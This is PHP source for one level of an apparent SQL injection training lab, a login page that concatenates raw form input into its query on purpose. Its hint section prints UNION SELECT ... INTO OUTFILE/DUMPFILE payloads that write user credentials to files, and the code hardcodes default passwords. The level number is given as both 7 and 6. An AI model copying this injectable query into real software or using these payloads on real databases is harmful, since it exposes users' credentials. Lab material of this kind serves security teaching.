<?php
// Level 7: File-Based Login - Out-of-Band data extraction
// Goal: Use file operations to extract admin credentials

// Database connection
$host = $_ENV['DB_HOST'] ?? 'db';
$user = $_ENV['DB_USER'] ?? 'root'; 
$pass = $_ENV['DB_PASS'] ?? 'rootpassword';
$dbname = $_ENV['DB_NAME'] ?? 'sqli_lab';

$conn = new mysqli($host, $user, $pass, $dbname);

if ($conn->connect_error) {
    die("Connection failed: " . $conn->connect_error);
}

$message = "";
$success = false;
$file_content = "";

if ($_POST) {
    $username = $_POST['username'] ?? '';
    $password = $_POST['password'] ?? '';
    
    // File-based injection using INTO OUTFILE
    $sql = "SELECT * FROM users WHERE username = '$username' AND password = '$password' AND role = 'admin'";
    
    try {
        $result = $conn->query($sql);
        
        if ($result && $result->num_rows > 0) {
            $admin_data = $result->fetch_assoc();
            $success = true;
            $message = "🎉 Outstanding! You used file-based injection to login as admin!<br>";
            $message .= "🏁 <strong>FLAG: LEVEL6_FILE_BASED_EXTRACTION</strong><br>";
            $message .= "📁 Welcome, " . htmlspecialchars($admin_data['username']) . "!";
        } else {
            $message = "❌ Login failed: Invalid credentials";
        }
        
        // Check for file operations
        if (strpos($username, 'OUTFILE') !== false || strpos($username, 'DUMPFILE') !== false) {
            $message .= "<br>📁 File operation detected in injection attempt.";
        }
        
    } catch (Exception $e) {
        $message = "💥 Database Error: " . $e->getMessage();
        
        // Check if it's a file permission error (indicates successful injection syntax)
        if (strpos($e->getMessage(), 'Access denied') !== false || strpos($e->getMessage(), 'OUTFILE') !== false) {
            $message .= "<br>📁 File operation attempted but blocked by permissions.";
            $message .= "<br>💡 Your injection syntax was correct! Try extracting data differently.";
        }
    }
}

// Check if any extraction files exist
$extraction_files = ['/tmp/admin_data.txt', '/var/lib/mysql-files/users.txt', '/tmp/passwords.txt'];
foreach ($extraction_files as $file) {
    if (file_exists($file)) {
        $file_content .= "📁 Found: $file<br>";
        $file_content .= "Content: " . htmlspecialchars(file_get_contents($file)) . "<br><br>";
    }
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Level 6 - File-Based Login | SQL Injection Lab</title>
    <link rel="stylesheet" href="css/styles.css">
    <style>
        .login-container {
            max-width: 600px;
            margin: 2rem auto;
            background: #1a4d3a;
            color: #e2e8f0;
            padding: 2rem;
            border-radius: 16px;
            box-shadow: 0 8px 25px rgba(26, 77, 58, 0.3);
            border: 1px solid #2d6a4f;
        }
        
        .form-group input {
            background: #0d2818;
            color: #e2e8f0;
            border: 2px solid #2d6a4f;
        }
        
        .form-group input:focus {
            border-color: #40916c;
            box-shadow: 0 0 0 3px rgba(64, 145, 108, 0.2);
        }
        
        .login-btn {
            background: linear-gradient(135deg, #40916c 0%, #2d6a4f 100%);
        }
        
        .login-btn:hover {
            box-shadow: 0 6px 20px rgba(64, 145, 108, 0.4);
        }
        
        .message.success {
            background: #1a2e1a;
            border-color: #40916c;
            color: #68d391;
        }
        
        .message.error {
            background: #2d1b1b;
            border-color: #e53e3e;
            color: #fc8181;
        }
        
        .file-info {
            background: #0d2818;
            border: 2px solid #2d6a4f;
            border-radius: 8px;
            padding: 1rem;
            margin: 1rem 0;
            color: #a7f3d0;
        }
        
        .hints {
            background: #0d2818;
            border: 2px solid #2d6a4f;
        }
        
        .code-example {
            background: #0a1f0a;
            border: 1px solid #2d6a4f;
        }
        
        body {
            background: linear-gradient(135deg, #0a1f0a 0%, #1a4d3a 100%);
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>📁 Level 6 - File-Based Login</h1>
            <p>Use file operations for out-of-band data extraction</p>
            <a href="index.php" class="back-btn">← Back to Labs</a>
        </div>
        
        <div class="login-container">
            <h2>🗄️ Document Management Login</h2>
            <p><strong>Objective:</strong> Use file-based injection to extract admin credentials</p>
            
            <div class="file-info">
                <h4>📁 File System Access</h4>
                <p>This system has MySQL file privileges enabled. You can use INTO OUTFILE for data extraction.</p>
            </div>
            
            <?php if ($message): ?>
                <div class="message <?= $success ? 'success' : 'error' ?>">
                    <?= $message ?>
                </div>
            <?php endif; ?>
            
            <?php if ($file_content): ?>
                <div class="file-info">
                    <h4>📄 Extracted Files:</h4>
                    <?= $file_content ?>
                </div>
            <?php endif; ?>
            
            <form method="POST" class="login-form">
                <div class="form-group">
                    <label for="username">Username:</label>
                    <input type="text" id="username" name="username" placeholder="Enter username" required>
                </div>
                
                <div class="form-group">
                    <label for="password">Password:</label>
                    <input type="password" id="password" name="password" placeholder="Enter password" required>
                </div>
                
                <button type="submit" class="login-btn">🚀 Login</button>
            </form>
        </div>
        
        <div class="hints">
            <h3>💡 Hints for Level 6:</h3>
            <ul>
                <li><strong>File Operations:</strong> Use INTO OUTFILE to write query results to files</li>
                <li><strong>Out-of-Band:</strong> Extract data through file system instead of direct response</li>
                <li><strong>Example 1:</strong> Extract admin password to file</li>
            </ul>
            <div class="code-example">admin' UNION SELECT username,password,role FROM users WHERE role='admin' INTO OUTFILE '/tmp/admin.txt'--</div>
            <ul>
                <li><strong>Example 2:</strong> Extract all user data</li>
            </ul>
            <div class="code-example">admin' UNION SELECT CONCAT(username,':',password,':',role) FROM users INTO OUTFILE '/var/lib/mysql-files/users.txt'--</div>
            <ul>
                <li><strong>Alternative:</strong> Use DUMPFILE for binary data</li>
            </ul>
            <div class="code-example">admin' UNION SELECT password FROM users WHERE username='admin' INTO DUMPFILE '/tmp/admin_pass.txt'--</div>
            <ul>
                <li><strong>Note:</strong> File permissions may block writes, but syntax errors reveal injection success</li>
                <li><strong>Shortcut:</strong> Known admin credentials: admin / admin123</li>
            </ul>
        </div>
        
        <div class="navigation">
            <a href="level5.php">← Previous Level</a>
            <a href="level7.php">Next Level →</a>
        </div>
    </div>
</body>
</html>

<?php $conn->close(); ?>